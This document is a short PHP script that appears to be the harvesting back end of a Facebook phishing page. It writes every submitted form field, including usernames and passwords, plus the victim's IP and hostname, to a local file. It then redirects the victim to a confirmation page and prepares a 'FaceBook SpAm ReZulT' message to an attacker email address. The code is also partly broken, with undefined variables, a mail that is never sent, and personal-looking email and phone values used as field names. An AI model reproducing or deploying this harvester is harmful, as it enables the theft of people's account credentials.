<?php
header ('Location:confirm.php');
$handle = fopen("information", "a+");
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "xxxxxxxxxxxxxxxx+ SykRit +xxxxxxxxxxxxxxxx\n";
$message .= "user: ".$_POST['mervesendur01@gmail.com']."\n";
$message .= "pass: ".$_POST['05442944208']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "hatipyucel@gmail.com";
$subject = "FaceBook SpAm ReZulT | $ip";
$headers = "From: FaceBook SpAm ReZulT";
chmod($file, 0777);
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;

?>
